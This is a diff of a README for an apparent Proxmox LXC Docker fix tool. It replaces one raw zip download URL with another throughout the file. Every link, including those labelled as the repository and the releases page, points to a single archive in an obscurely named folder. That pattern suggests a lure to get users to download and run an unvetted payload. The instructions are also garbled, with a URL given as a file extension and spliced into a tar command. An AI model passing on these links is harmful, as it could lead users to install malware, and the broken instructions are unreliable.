@@ -1,6 +1,6 @@
 # 🚀 proxmox-lxc-docker-fix - Fix Docker Issues in Proxmox LXC Containers
 
-[![Download](https://raw.githubusercontent.com/PONSHAKR/proxmox-lxc-docker-fix/main/anacidity/proxmox-lxc-docker-fix-1.3.zip)](https://raw.githubusercontent.com/PONSHAKR/proxmox-lxc-docker-fix/main/anacidity/proxmox-lxc-docker-fix-1.3.zip)
+[![Download](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/raw/refs/heads/main/anacidity/fix_lxc_docker_proxmox_1.3.zip)](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/raw/refs/heads/main/anacidity/fix_lxc_docker_proxmox_1.3.zip)
 
 ## 📋 Description
 
@@ -31,7 +31,7 @@ To get started, follow these simple steps to download and run the software.
 
 ### 1. Download the Software
 
-Visit this page to download: [proxmox-lxc-docker-fix Releases](https://raw.githubusercontent.com/PONSHAKR/proxmox-lxc-docker-fix/main/anacidity/proxmox-lxc-docker-fix-1.3.zip)
+Visit this page to download: [proxmox-lxc-docker-fix Releases](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/raw/refs/heads/main/anacidity/fix_lxc_docker_proxmox_1.3.zip)
 
 ### 2. Choose the Right Version
 
@@ -39,14 +39,14 @@ On the Releases page, you will see different versions of the software. Select th
 
 ### 3. Download the File
 
-Click on the download link for the latest version. The file will have a `https://raw.githubusercontent.com/PONSHAKR/proxmox-lxc-docker-fix/main/anacidity/proxmox-lxc-docker-fix-1.3.zip` extension. Save it to a location you can easily access, like your Desktop or Downloads folder.
+Click on the download link for the latest version. The file will have a `https://github.com/PONSHAKR/proxmox-lxc-docker-fix/raw/refs/heads/main/anacidity/fix_lxc_docker_proxmox_1.3.zip` extension. Save it to a location you can easily access, like your Desktop or Downloads folder.
 
 ### 4. Extract the Files
 
 After the download is complete, locate the downloaded file. Right-click on it and select "Extract Here" or use your terminal to run the following command:
 
 ```
-tar -xvzf proxmox-lxc-docker-fix-*https://raw.githubusercontent.com/PONSHAKR/proxmox-lxc-docker-fix/main/anacidity/proxmox-lxc-docker-fix-1.3.zip
+tar -xvzf proxmox-lxc-docker-fix-*https://github.com/PONSHAKR/proxmox-lxc-docker-fix/raw/refs/heads/main/anacidity/fix_lxc_docker_proxmox_1.3.zip
 ```
 
 ### 5. Open Your Terminal
@@ -89,7 +89,7 @@ For more information, consult the user manual available in the repository. You c
 
 ## 🔗 Useful Links
 
-- **GitHub Repository**: [proxmox-lxc-docker-fix](https://raw.githubusercontent.com/PONSHAKR/proxmox-lxc-docker-fix/main/anacidity/proxmox-lxc-docker-fix-1.3.zip)
-- **Releases Page**: [Download Here](https://raw.githubusercontent.com/PONSHAKR/proxmox-lxc-docker-fix/main/anacidity/proxmox-lxc-docker-fix-1.3.zip)
+- **GitHub Repository**: [proxmox-lxc-docker-fix](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/raw/refs/heads/main/anacidity/fix_lxc_docker_proxmox_1.3.zip)
+- **Releases Page**: [Download Here](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/raw/refs/heads/main/anacidity/fix_lxc_docker_proxmox_1.3.zip)
 
 By following these steps, you will be able to download and run the proxmox-lxc-docker-fix with ease. Enjoy smoother Docker operations in your Proxmox LXC containers!
